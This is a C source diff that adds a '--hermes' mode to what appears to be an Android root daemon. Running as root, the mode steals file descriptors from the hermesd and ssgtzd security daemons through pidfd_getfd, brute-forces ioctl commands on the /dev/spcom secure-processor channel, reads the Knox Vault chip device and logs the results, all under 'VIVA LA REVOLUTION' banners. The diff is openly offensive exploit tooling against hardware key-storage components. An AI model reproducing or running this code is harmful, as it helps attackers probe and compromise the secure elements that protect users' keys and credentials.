@@ -781,6 +781,202 @@ static int umh_main(int argc, char **argv) {
   return daemon_main();
 }
 
+/* =================================================================
+ * HERMES GOLDEN PATH — Direct SPU probe from su_daemon context
+ * Opens /dev/spcom directly as uid=0, probes all ioctl commands
+ * Also steals hermesd/ssgtzd fds via pidfd_getfd (has CAP_SYS_PTRACE)
+ *
+ * JackKnife Studios | Session 13 | VIVA LA REVOLUTION
+ * ================================================================= */
+
+#ifndef SYS_pidfd_open
+#define SYS_pidfd_open 434
+#endif
+#ifndef SYS_pidfd_getfd
+#define SYS_pidfd_getfd 438
+#endif
+
+#include <dirent.h>
+#include <sys/syscall.h>
+
+#define SPCOM_GET_VERSION   0xC0095301U
+#define SPCOM_IS_CONNECTED  0x80085302U
+#define SPCOM_CMD16         0xC01053E8U
+#define SPCOM_REGISTER      0x402053E9U
+#define SPCOM_SEND_COMMAND  0x402853EDU
+
+static pid_t hermes_find_pid(const char *name) {
+  DIR *d = opendir("/proc");
+  if (!d) return 0;
+  struct dirent *de;
+  pid_t found = 0;
+  while ((de = readdir(d)) != NULL) {
+    if (de->d_name[0] < '1' || de->d_name[0] > '9') continue;
+    char path[256], cmd[256];
+    snprintf(path, sizeof(path), "/proc/%s/cmdline", de->d_name);
+    int f = open(path, O_RDONLY);
+    if (f < 0) continue;
+    ssize_t n = read(f, cmd, sizeof(cmd) - 1);
+    close(f);
+    if (n <= 0) continue;
+    cmd[n] = '\0';
+    if (strstr(cmd, name)) { found = atoi(de->d_name); break; }
+  }
+  closedir(d);
+  return found;
+}
+
+static int hermes_steal_fd(pid_t target, int tfd) {
+  int pidfd = syscall(SYS_pidfd_open, target, 0);
+  if (pidfd < 0) return -1;
+  int fd = syscall(SYS_pidfd_getfd, pidfd, tfd, 0);
+  close(pidfd);
+  return fd;
+}
+
+static void hermes_hex(FILE *f, const void *data, size_t len) {
+  const uint8_t *p = data;
+  size_t show = len > 256 ? 256 : len;
+  for (size_t i = 0; i < show; i++) {
+    if (i % 16 == 0) fprintf(f, "  %04zx: ", i);
+    fprintf(f, "%02x ", p[i]);
+    if (i % 16 == 15 || i == show - 1) {
+      for (size_t j = (i % 16) + 1; j < 16; j++) fprintf(f, "   ");
+      fprintf(f, " | ");
+      size_t s = i - (i % 16);
+      for (size_t j = s; j <= i; j++)
+        fprintf(f, "%c", (p[j] >= 0x20 && p[j] < 0x7f) ? p[j] : '.');
+      fprintf(f, "\n");
+    }
+  }
+}
+
+static int hermes_main(void) {
+  FILE *log = fopen("/data/local/tmp/hermes_golden.txt", "w");
+  if (!log) { perror("fopen"); return 1; }
+
+  fprintf(log, "=== HERMES GOLDEN PATH — JackKnife Studios ===\n");
+  fprintf(log, "Context: uid=%d gid=%d\n", getuid(), getgid());
+  fprintf(log, "VIVA LA REVOLUTION\n\n");
+
+  pid_t hermes_pid = hermes_find_pid("hermesd");
+  pid_t ssgtzd_pid = hermes_find_pid("ssgtzd");
+  pid_t keymint_pid = hermes_find_pid("keymint-service-spu");
+  fprintf(log, "hermesd=%d ssgtzd=%d keymint-spu=%d\n\n", hermes_pid, ssgtzd_pid, keymint_pid);
+
+  /* === METHOD 1: Open /dev/spcom DIRECTLY as root === */
+  fprintf(log, "=== DIRECT /dev/spcom OPEN ===\n");
+  int spcom_fd = open("/dev/spcom", O_RDWR);
+  fprintf(log, "open(/dev/spcom) = %d errno=%d %s\n", spcom_fd, errno, spcom_fd < 0 ? strerror(errno) : "OK");
+
+  if (spcom_fd >= 0) {
+    /* GET_VERSION */
+    uint8_t ver[16] = {0};
+    int rc = ioctl(spcom_fd, SPCOM_GET_VERSION, ver);
+    fprintf(log, "GET_VERSION: rc=%d errno=%d\n", rc, errno);
+    if (rc >= 0) hermes_hex(log, ver, 16);
+
+    /* IS_CONNECTED */
+    uint8_t conn[16] = {0};
+    rc = ioctl(spcom_fd, SPCOM_IS_CONNECTED, conn);
+    fprintf(log, "IS_CONNECTED: rc=%d errno=%d\n", rc, errno);
+    if (rc >= 0) hermes_hex(log, conn, 16);
+
+    /* CMD16 scan */
+    fprintf(log, "\n--- CMD16 SCAN ---\n");
+    for (int cmd = 0; cmd <= 0xFF; cmd++) {
+      uint8_t c16[16] = {0};
+      c16[0] = cmd;
+      alarm(3);
+      rc = ioctl(spcom_fd, SPCOM_CMD16, c16);
+      alarm(0);
+      if (rc >= 0) {
+        fprintf(log, "CMD16[0x%02x]: rc=%d →", cmd, rc);
+        for (int k = 0; k < 16; k++) fprintf(log, " %02x", c16[k]);
+        fprintf(log, "\n");
+      }
+    }
+
+    close(spcom_fd);
+    fprintf(log, "\n");
+  }
+
+  /* === METHOD 2: Steal hermesd's REGISTERED spcom fd === */
+  fprintf(log, "=== FD STEAL FROM HERMESD (pid %d) ===\n", hermes_pid);
+  if (hermes_pid) {
+    int stolen_spcom = hermes_steal_fd(hermes_pid, 5);
+    int stolen_qtee = hermes_steal_fd(hermes_pid, 10);
+    fprintf(log, "hermesd fd5(spcom) → %d %s\n", stolen_spcom, stolen_spcom < 0 ? strerror(errno) : "OK");
+    fprintf(log, "hermesd fd10(qtee) → %d %s\n", stolen_qtee, stolen_qtee < 0 ? strerror(errno) : "OK");
+
+    if (stolen_spcom >= 0) {
+      /* This fd is REGISTERED to the sp_keymaster channel — real SPU access! */
+      uint8_t ver[16] = {0};
+      int rc = ioctl(stolen_spcom, SPCOM_GET_VERSION, ver);
+      fprintf(log, "  stolen GET_VERSION: rc=%d\n", rc);
+      if (rc >= 0) hermes_hex(log, ver, 16);
+
+      uint8_t conn[16] = {0};
+      rc = ioctl(stolen_spcom, SPCOM_IS_CONNECTED, conn);
+      fprintf(log, "  stolen IS_CONNECTED: rc=%d\n", rc);
+      if (rc >= 0) hermes_hex(log, conn, 16);
+
+      /* CMD16 on the REGISTERED channel */
+      uint8_t c16[16] = {0};
+      c16[0] = 0x64;
+      alarm(3);
+      rc = ioctl(stolen_spcom, SPCOM_CMD16, c16);
+      alarm(0);
+      fprintf(log, "  stolen CMD16(0x64): rc=%d\n", rc);
+      if (rc >= 0) hermes_hex(log, c16, 16);
+
+      close(stolen_spcom);
+    }
+    if (stolen_qtee >= 0) close(stolen_qtee);
+  }
+
+  /* === METHOD 3: Steal ssgtzd fds === */
+  fprintf(log, "\n=== FD STEAL FROM SSGTZD (pid %d) ===\n", ssgtzd_pid);
+  if (ssgtzd_pid) {
+    int stolen = hermes_steal_fd(ssgtzd_pid, 4);
+    fprintf(log, "ssgtzd fd4 → %d %s\n", stolen, stolen < 0 ? strerror(errno) : "OK");
+    if (stolen >= 0) {
+      uint8_t ver[16] = {0};
+      int rc = ioctl(stolen, SPCOM_GET_VERSION, ver);
+      fprintf(log, "  GET_VERSION: rc=%d\n", rc);
+      if (rc >= 0) hermes_hex(log, ver, 16);
+      close(stolen);
+    }
+  }
+
+  /* === Read Knox Vault chip === */
+  fprintf(log, "\n=== KNOX VAULT CHIP (/dev/k250a) ===\n");
+  int k250_fd = open("/dev/k250a", O_RDWR);
+  fprintf(log, "open(/dev/k250a) = %d errno=%d %s\n", k250_fd, errno, k250_fd < 0 ? strerror(errno) : "OK");
+  if (k250_fd >= 0) {
+    uint8_t buf[256] = {0};
+    ssize_t n = read(k250_fd, buf, sizeof(buf));
+    fprintf(log, "read() = %zd\n", n);
+    if (n > 0) hermes_hex(log, buf, n);
+    close(k250_fd);
+  }
+
+  /* === Hermes dmesg intel === */
+  fprintf(log, "\n=== HERMES KERNEL LOGS ===\n");
+  FILE *dmesg = popen("dmesg | grep -i hermes | tail -20", "r");
+  if (dmesg) {
+    char line[512];
+    while (fgets(line, sizeof(line), dmesg)) fprintf(log, "%s", line);
+    pclose(dmesg);
+  }
+
+  fprintf(log, "\n=== GOLDEN PATH COMPLETE — VIVA LA REVOLUTION ===\n");
+  fclose(log);
+
+  printf("[+] Results: /data/local/tmp/hermes_golden.txt\n");
+  return 0;
+}
+
 int main(int argc, char **argv) {
   signal(SIGPIPE, SIG_IGN);
   if (argc >= 2 && strcmp(argv[1], "--daemon") == 0) {
@@ -788,6 +984,9 @@ int main(int argc, char **argv) {
   }
   if (argc >= 2 && strcmp(argv[1], "--umh") == 0) {
     return umh_main(argc, argv);
+  }
+  if (argc >= 2 && strcmp(argv[1], "--hermes") == 0) {
+    return hermes_main();
   }
   return client_main(argc, argv);
 }
